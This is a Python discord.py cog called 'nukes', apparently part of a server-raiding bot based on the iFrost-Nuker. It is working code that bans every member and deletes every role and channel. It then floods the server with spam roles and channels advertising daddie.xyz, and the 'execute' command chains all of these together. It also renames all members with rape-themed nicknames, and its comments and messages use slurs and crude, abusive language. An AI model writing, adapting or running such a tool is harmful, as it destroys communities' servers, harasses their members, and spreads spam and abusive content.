import discord
from discord.ext import commands
from discord.ext import tasks
from colorama import Fore, init


#################################################################################
#                                                                               #
# This is a higly dangerous and volitile module please for the love of fuck     #
# Don't "accidentally" run shit in here then cry when you get raped by discord  #
# or the server gets nuked for example lol. It's just no.. it doesn't go well   #
#                                                                               #
# So please for the love of fucking god be CAREFUL                              #
#                                                                               #
#################################################################################


# NOTE: A lot of this code is based on the iFrost-Nuker which can be found here
# https://github.com/iFrost1337/iFrost-Nuker


class nukes(commands.Cog):
    """All hail DiscoRape we will bring the commoners to their knees"""

    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def banAll(self, ctx):
        """Bans all members in the guild the command is used"""
        await ctx.message.delete()
        await ctx.send(
            "Well shit looks like this is getting nuked\n:wave:Bye Bye Members"
        )
        await ctx.send("Please stand by...")
        print(
            f"{Fore.RED}[-]banAll > {Fore.RESET}Starting to ban all members of {ctx.guild} "
        )
        for member in ctx.guild.members:
            try:
                await member.ban()
                print(f"{Fore.GREEN}[-]banAll > {Fore.RESET}Banned: {member}")
            except Exception as e:
                print(
                    f"{Fore.RED}[-]banAll > {Fore.RESET}Failed to ban {member}\n{e}\n"
                )

    @commands.command()
    async def rolecreate(self, ctx):
        """Mass creates roles

        Usage
        • rolecreate
        """
        await ctx.message.delete()
        await ctx.send("Starting role creation..")
        await ctx.send("Please wait...")
        print("Spam role creating procession has begun!")
        for i in range(1, 25):
            try:
                await ctx.guild.create_role(
                    name=f"RAPED BY DISCORAPE https://daddie.xyz{i}"
                )
                print(
                    f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Made role:  RAPED BY DISCORAPE https://daddie.xyz{i}"
                )
            except:
                print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Failed to make role")

    @commands.command()
    async def channelcreate(self, ctx):
        """Spams the everloving fuck outta the channels voice text and category\nNote: It's a pain in the ass to clean up"""
        await ctx.message.delete()
        await ctx.send("Time to spam super fucking gay shit")
        await ctx.send("Standby for spam creation")
        print(f"{Fore.RED}[-]CHANNEL > Spam channel creation has begun!")
        for i in range(1, 25):
            try:
                await ctx.guild.create_text_channel(
                    name=f"NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
                )
                print(
                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made text channel:  NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
                )
                await ctx.guild.create_voice_channel(
                    name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
                )
                print(
                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made voice channel:  NUKED BY DISCORAPE {i} https://daddie.xyz"
                )
                await ctx.guild.create_category(
                    name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
                )
                print(
                    f"{Fore.RED}[-]CHANNEl > {Fore.RESET}Made category: NUKED BY DISCORAPE {i} https://daddie.xyz"
                )
            except:
                print("An error occured while trying to make the channels")

    @commands.command()
    async def channeldelete(self, ctx):
        """Deletes any and every channel it can delete"""
        await ctx.send("Deleting all channels...\nhttps://daddie.xyz")
        await ctx.send("Standby...")
        print(f"{Fore.RED}[-]DANGER > Channel nuking has begun!")
        for channel in ctx.guild.channels:
            try:
                print(f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}DELETED {channel}")
                await channel.delete()
            except:
                print(f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Failed to delete: {channel}")

    @commands.command()
    async def roledelete(self, ctx):
        """Deletes every role except roles above you or bot specific roles like dyno"""
        await ctx.message.delete()
        await ctx.send("Spamming role deletion..")
        await ctx.send("Please wait...")
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.roles[-1] > role:
                try:
                    await role.delete()
                    print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Deleted {role}")

                except:
                    print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Failed to delete {role}")

    @commands.command()
    async def execute(self, ctx):
        """Nukes the fucking shit outta the server banning everyone silently. While no one notices\nNext up it deletes all roles  then creates DiscoRape roles\nThen it deletes all channels possible to then make DiscoRape channels"""
        await ctx.message.delete()

        print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Started role DELETION")
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.roles[-1] > role:
                try:
                    await role.delete()
                    print(f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Deleted {role}")
                except:
                    print(
                        f"{Fore.RED}[-]ROLE > {Fore.RESET}Failed to delete role: {role}"
                    )
            else:
                await ctx.send("There was an error while deleting the roles.")

        print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Starting to nuke roles")

        for i in range(1, 50):
            try:
                await ctx.guild.create_role(
                    name=f"NUKED BY DISCORAPE https://daddie.xyz {i}"
                )
                print(
                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY DISCORAPE https://daddie.xyz {i}"
                )
            except Exception as e:
                print(f"Error while makign role.\n\nError: {e}")
        # SPAM ROLE SHIT CANT BE ASKED TO MAKE IT
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}DELETED {channel}")
            except:
                print(f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Failed to delete {channel}")

                print(
            f"{Fore.RED}[-]DANGER > {Fore.RESET}Nuking has begun...\n{Fore.RED}[-]BANNING > {Fore.RESET}Banning process has begun\n"
        )
        
        for member in ctx.guild.members:
            print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Attempting to ban {member}")
            try:
                await member.ban()
                print(
                    f"{Fore.RED}[-]BANNING > {Fore.RESET}Successfully banned {member}"
                )
            except:
                print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Failed to ban {member}")

        print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Finished banning members")        
        # delete all channels so we can flood that shit lmfao

        for i in range(1, 25):
            try:
                await ctx.guild.create_text_channel(
                    name=f"NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
                )
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
                )
                await ctx.guild.create_voice_channel(
                    name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
                )
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY DISCORAPE {i} https://daddie.xyz"
                )
                await ctx.guild.create_category(
                    name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
                )
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made category! NUKED BY DISCORAPE {i} https://daddie.xyz"
                )
            except Exception as e:
                print(f"Error while making channels\nError: {e}")
        print(f"{Fore.RED}[-]NUKE > {Fore.RESET}Nuking finished!")

    @commands.command()
    async def undoreall(self, ctx):
        """Renames every member in the server to raped by DiscoRape"""
        await ctx.delete()
        rename_to = ""
        i = 0
        for user in list(ctx.guild.members):
            try:
                i += 1
                await user.edit(nick=f"{rename_to}")
                print(
                    f"{Fore.GREEN}[-]NICK > {Fore.RESET}Old name: {user.name} | New name: {rename_to} | Guild: {ctx.guild.name}"
                )
            except Exception as e:
                print(
                    f"{Fore.RED}[-]NICK > {Fore.RESET}{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}\nError > {e}"
                )
        print(f"{Fore.RED}[-]NICK > {Fore.RESET}Action Completed: rall")

    @commands.command()
    async def reall(self, ctx):
        """Renames every member in the server to raped by DiscoRape"""
        await ctx.delete()
        rename_to = "Raped by DiscoRape"
        i = 0
        for user in list(ctx.guild.members):
            try:
                i += 1
                await user.edit(nick=f"{rename_to}{i}")
                print(
                f"{Fore.GREEN}[-]NICK > {Fore.RESET}Old name: {user.name} | New name: {rename_to} | Guild: {ctx.guild.name}"
                )
            except Exception as e:
                print(
                f"{Fore.RED}[-]NICK > {Fore.RESET}{user.name} has NOT been renamed to {rename_to}{i} in {ctx.guild.name}\nError > {e}"
                )
        print(f"{Fore.RED}[-]NICK > {Fore.RESET}Action Completed: rall")


def setup(bot):
    bot.add_cog(nukes(bot))
